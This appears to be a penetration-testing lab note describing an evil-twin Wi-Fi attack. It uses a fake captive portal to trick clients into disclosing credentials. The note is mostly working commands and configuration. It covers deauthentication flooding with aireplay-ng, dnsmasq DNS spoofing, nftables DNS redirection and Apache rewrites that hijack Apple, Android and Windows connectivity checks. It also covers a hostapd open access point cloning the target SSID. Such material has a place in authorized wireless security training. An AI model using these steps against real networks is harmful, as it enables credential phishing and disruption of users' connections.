### Introduction
---
Captive Portals are those web login pages for the free / guest Wi-Fis. 

Attack Methodology - Create a fake Captive Portals to trick clients to disclose their credentials.

### Attack
---
##### Step 1: Enumerating the target AP
Capture traffics & intercept a handshake as usual:
```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```

```
sudo aireplay-ng -0 0 -a [target bssid] wlan0mon
```

##### Step 2: Building the portal
Using PHP & Apache2:
```
sudo apt install apache2 libapache2-mod-php
```

Save our `index.php` under:
```
/var/www/html/portal
```

##### Step 3: Network Setup
Assign an IP to our wlan0 interface:
```
sudo ip addr add 192.168.87.1/24 dev wlan0 && sudo ip link set wlan0 up
```

Setup a small DHCP server:
```
sudo apt install dnsmasq
```

For the `mco-dnsmasq.conf`:
```
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

### DNS Spoofing
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255

```

Run `dnsmasq` with the config file:
```
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

For clients that ignore DNS settings from DHCP, we can force them to redirect with `nftable` rule:
```
sudo apt install nftables
```

```
sudo nft add table ip nat
```

```
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
```

```
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

Append the following to the end of apache2 config (`/etc/apache2/sites-enabled/000-default.conf`):
```
# Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]
```

Enable the two rules:
```
sudo a2enmod rewrite
```

```
sudo a2enmod alias
```

###### CHROME Only:
Duplicate the VirtualHost (80) and change to 443.
```
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

Use the preinstalled snakeoil certificates:
```
sudo a2enmod ssl & sudo systemctl restart apache2
```

##### Step 4: Running the Rogue AP
Set up a rogue AP with the same SSID & channel as the target AP, except without any encryptions.
```
mousepad hostap.config
```

```
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

Then run `hostapd`:
```
sudo hostapd -B hostapd.conf
```
